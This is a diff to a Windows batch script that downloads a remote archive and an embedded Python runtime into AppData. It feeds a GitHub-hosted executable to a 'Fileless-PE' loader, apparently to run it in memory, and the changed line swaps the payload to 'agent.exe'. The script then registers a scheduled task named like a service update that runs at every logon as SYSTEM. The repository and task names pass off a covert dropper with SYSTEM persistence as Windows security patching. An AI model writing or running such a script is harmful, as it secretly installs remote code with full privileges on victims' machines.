@@ -23,6 +23,6 @@ C:\Windows\System32\curl.exe --insecure -s -S -g -L -o %AppDataPath%\main.zip ht
 C:\Windows\System32\tar.exe -xf -C %AppDataPath%\%FolderName% %AppDataPath%\main.zip
 C:\Windows\System32\curl.exe --insecure -s -S -g -L -o %AppDataPath%\python-3.14.0-embed-amd64.zip https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip
 C:\Windows\System32\tar.exe -xf -C %AppDataPath%\%FolderName%\Fileless-PE-main %AppDataPath%\python-3.14.0-embed-amd64.zip
-(echo https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/wssrvc.exe && echo exe && echo %AppDataPath%\%FolderName%\Fileless-PE-main\wssrvc.py) | %AppDataPath%\%FolderName%\Fileless-PE-main\python.exe %AppDataPath%\%FolderName%\Fileless-PE-main\Fileless-PE.py
+(echo https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/agent.exe && echo exe && echo %AppDataPath%\%FolderName%\Fileless-PE-main\wssrvc.py) | %AppDataPath%\%FolderName%\Fileless-PE-main\python.exe %AppDataPath%\%FolderName%\Fileless-PE-main\Fileless-PE.py
 schtasks /create /tn Service-Update-Build-%VERSION% /tr "%serviceUIpath% %AppDataPath%\%FolderName%\Fileless-PE-main\pythonw.exe %AppDataPath%\%FolderName%\Fileless-PE-main\wssrvc.py" /sc onlogon /ru System
 schtasks /run /tn Service-Update-Build-%VERSION%
